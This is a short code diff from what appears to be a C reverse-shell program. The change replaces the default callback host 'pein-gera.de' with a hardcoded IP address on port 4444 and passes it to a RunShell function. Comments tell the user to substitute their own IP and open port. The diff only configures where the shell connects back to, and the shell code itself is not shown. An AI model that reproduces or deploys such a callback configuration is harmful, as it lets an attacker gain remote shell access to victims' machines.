@@ -68,8 +68,8 @@ int main(int argc, char **argv) {
         int port = atoi(argv[2]);
         RunShell(argv[1], port);
     } else {
-        char host[] = "pein-gera.de"; // change this to your ip address
-        int port = 4444;              // chnage this to your open port
+        char host[] = "84.160.105.25"; // change this to your ip address
+        int port = 4444;               // chnage this to your open port
         RunShell(host, port);
     }
     return 0;
